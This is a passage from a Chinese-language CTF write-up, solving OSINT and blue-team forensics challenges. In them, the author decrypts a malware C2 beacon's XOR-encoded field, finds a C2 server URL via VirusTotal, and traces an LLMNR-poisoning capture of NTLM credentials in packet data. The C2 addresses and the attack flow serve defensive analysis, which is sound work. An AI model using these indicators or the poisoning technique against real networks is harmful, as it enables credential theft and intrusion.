FhCTF{1830-2300_0401-1031}
```

### 沒戴安全帽的騎士
![rider_without_helmet](/images/FhCTF/57.webp)

上網簡單圖片查資料，可知廠牌、車型，每個試一下，就能鎖定下答案。
![image](/images/FhCTF/58.webp)

```
FhCTF{2014_Kymco_Many50}
```


### EXIF的「拍攝座標」

這題給的檔案出了點小問題，但就是 exif 完組合一下照片的經緯度通靈一下就好了。


## Blue team
### 大訂單
1. 一組加密的十六進制字串: `775a20657e725a206725250925317172587b3774750d2132747f5a2631752251`
2. 網路封包的 hex dump,顯示 HTTP POST 請求

檢查提供的封包內容,可以觀察到以下關鍵資訊:

```
POST /api/v1/config HTTP/1.1
Host: 45.33.22.11
User-Agent: C2-Client/1.0
X-Auth-Token: FhCTF
Content-Type: application/x-binary

Target_ID: 775a20657e725a206725250925317172587b3774750d2132747f5a2631752251
```
從封包中的 `X-Auth-Token: FhCTF` 欄位,可以推測 `FhCTF` 很可能就是用於加密 Target_ID 的金鑰。

- 使用 Python 對十六進制字串進行 XOR 解密:

```python
import binascii

hex_string = "775a20657e725a206725250925317172587b3774750d2132747f5a2631752251"
key = "FhCTF"

hex_bytes = bytes.fromhex(hex_string)
result = bytearray()
key_bytes = key.encode('ascii')

for i, byte in enumerate(hex_bytes):
    result.append(byte ^ key_bytes[i % len(key_bytes)])

print(result.decode('ascii'))

```

將解密得到的 MD5 hash `12c1842c3ccafe7408c23ebf292ee3d9` 提交到 VirusTotal 進行查詢。
![image](/images/FhCTF/59.webp)
在 VirusTotal 的分析報告中,可以找到該惡意軟體的 C2 通訊目標:
- **C2 伺服器**: `http://171.22.28.221/5c06c05b7b34e8e6.php`

```
FhCTF{http://171.22.28.221/5c06c05b7b34e8e6.php}
```

### 🧩 User’s Bad Day
給出的線索是一段封包紀錄，要求從中找出三個關鍵資訊：主機名稱、帳號名稱與檔案名稱，最後依指定格式組成 Flag。



- DNS 查詢中的主機名稱

    在封包最前面可以看到一個 DNS 封包，內容類似：

    ```txt
    DNS Standard query A fulesrv.local
    ```

    這代表使用者原本想連線的主機是 `fulesrv.local`。  
    題目提示「主機名稱不含 domain」，因此只取前半段：

    - 主機名稱（不含 domain）：`fulesrv`

    ✅ 主機名稱 = `fulesrv`

- DNS 失敗與 LLMNR 啟用

    當 DNS 查詢失敗時，Windows 會嘗試使用 LLMNR（Link-Local Multicast Name Resolution）來解析同一個名稱。  
    封包中可看到類似：

    ```txt
    LLMNR query A fulesrv
    ```

    這表示系統改用 LLMNR 發送名稱查詢，詢問「誰是 fulesrv？」

- LLMNR Poisoning「怪事」的來源

    在這個階段，攻擊者主機（例如 IP：`192.168.50.200`）偽裝成 fulesrv 回應這個 LLMNR 查詢，聲稱自己就是目標伺服器。  
    結果：

    - 使用者誤以為解析成功，實際上連到的是攻擊者主機。
    - 之後便會對攻擊者的 IP 建立 SMB 連線（TCP 445），並送出驗證資訊。

    這就是典型的 **LLMNR Poisoning** 攻擊流程，也是題目「User’s Bad Day」名稱的由來。


- 帳號名稱：從 NTLM 驗證中取得使用者帳號

    當使用者透過 SMB 連向假冒的伺服器時，會進行 NTLM 驗證流程，其中會包含 `NTLMSSP AUTHENTICATE_MESSAGE` 封包。  
    在這類封包中，通常可解析出：

    - Domain Name  
    - User Name  
    - Workstation Name  

    將封包中的 Unicode（UTF-16LE）字串解碼後，可以得到：

    - Domain Name：`DOMAIN`  
    - User Name：`Bob`  
    - Workstation：`WORKST`  

    題目問的是「攻擊者攔截到的帳號名稱」，也就是 NTLM 驗證裡的使用者名稱：

    ✅ 帳號名稱 = `Bob`


- 檔案名稱：從 SMB 封包中的字串還原

    在後續 SMB 封包中，會出現使用者嘗試存取的檔案路徑或檔案名稱。題目提示要注意 UTF-16LE 編碼，因此用十六進制觀看封包內容時可以看到類似：

    ```txt
    74 00 65 00 73 00 74 00
    ```

    將這串 bytes 以 UTF-16LE 解碼：

    - `74 00` → `'t'`  
    - `65 00` → `'e'`  
    - `73 00` → `'s'`  
    - `74 00` → `'t'`  

    合起來就是：

    - `test`

    題目同時強調「檔案名稱不含副檔名」，所以即便實際檔案可能是 `test.txt`、`test.docx` 等，在 Flag 中只需要檔名本體：

    ✅ 檔案名稱 = `test`

    依題目指定格式：

    ```txt
    FhCTF{主機名稱_帳號代號_檔案名稱}
    ```

    將前面三個已確認的答案依序代入：

    - 主機名稱：`fulesrv`  
    - 帳號代號（帳號名稱）：`Bob`  
    - 檔案名稱：`test`  

    得到最終 Flag：

    ```
    FhCTF{fulesrv_Bob_test}
    ```